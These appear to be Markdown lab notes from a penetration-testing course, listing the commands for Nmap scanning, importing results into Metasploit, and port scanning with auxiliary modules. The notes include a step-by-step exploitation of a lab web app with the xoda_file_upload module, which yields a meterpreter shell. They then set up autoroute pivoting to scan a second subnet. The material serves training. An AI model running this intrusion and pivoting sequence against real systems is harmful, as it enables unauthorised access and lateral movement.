# Nmap 

## Port Scanning & Enumeration with Nmap

## Demo: Port Scanning & Enumeration with Nmap

Export Scan in xml format:

`nmap -Pn -sV -O [target IP] -oX windows_server_2012`

`cat windows_server_2012`

## Importing Nmap Scan Results into MSF

## Demo

`ls`

`service postgresql start`

`msfconsole`

`db_status`

we are connected

`workspace`

creating new workspace:

`workspace -a Win2k12`

`db_import /root/windows_server_2012` (Tab autocompletion to see the files)

We check if it imported successfully:

`hosts`

Showing services for the winsrv2012 target:

`services`

We initiate a nmap scan from within the msfconsole:

`workspace`

`workspace -a Nmap_MSF`

`workspace`

`db_nmap -Pn -sV -O [target IP]`

`hosts`

`services`

`vulns`

# Enumeration

## Port Scanning with Auxiliary Modules

- Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing.
- We can use auxiliary modules to perform both TCP & UDP port scanning as well as enumerating information form services like FTP, SSH, HTTP etc
- Auxiliary modules can be used during the information gathering phase of a pentest as well as the post exploitation phase.
- We can also use auxiliary modules to discover hosts and perform port scanning on a different network subnet after we have obtained initial access on a target system.

## Lab Infrastructure

- Our objective is to utilize auxiliary modules to discover open ports on our first target.
- The next step will involve exploiting the service running on the target in order to obtain a foothold.
- We will then utilize our foothold to access other systems on a different network subnet (pivoting).
- We will then utilize auxiliary modules to scan for open ports on the second target.
![grafik](https://github.com/user-attachments/assets/9ab0ccac-9823-40da-8442-11f81a0e82b1)

## Demo: Port Scanning with Auxiliary Modules

Obtaining the target IP adress.

`ifconfig`

eth1, replacing 2 with 3

`service postgresql start`

`msfconsole`

msf6:`db_status`

msf6:`workspace -a Port_Scan`

We want to search the portscanner auxiliary module (we start with tcp)

`search portscan`

msf6:`auxiliary/scanner/portscan/tcp`

msf6:`ifconfig`

msf6:`show options`

msf6:`set rhosts [target IP]`

msf6:`run`

We download the Homepage (HTML Code):

msf6:`curl [target IP]`

msf6:`search xoda`

msf6:`use exploit/unix/webapp/xoda_file_upload`

`show options`

msf6:`set rhosts [target IP]`

We need to specify the path of the webApp:

msf6:`set targeturi /`

msf6:`set lhost [ownIP]`

msf6:`show options`

msf6:`exploit`

meterpreter:`sysinfo`

meterpreter:`shell`

`/bin/bash -i`

shell:`ifconfig`

eth1 is in the target 2 subnet (our system (target1) is eth1, for target2 change 2 to 3)

clear out

We add the route (We will be able to perform the scan):

meterpreter:`run autoroute -s [eth1]`

meterpreter:`background`

msf6 xoda exploit:`search portscan`

msf6 xoda exploit:`use portscan`

msf6 xoda exploit:`set rhosts [target2 IP]`

msf6 xoda exploit:`show options`

msf6 xoda exploit:`run`

Now we could start exploiting and pivoting the second target.

Using the UDP module:

msf6:`search udp_sweep`

msf6:`use auxiliary/scanner/discovery/udp_sweep`

msf6:`show options`

msf6:`ifconfig`

msf6:`set rhosts [targetIP]`
















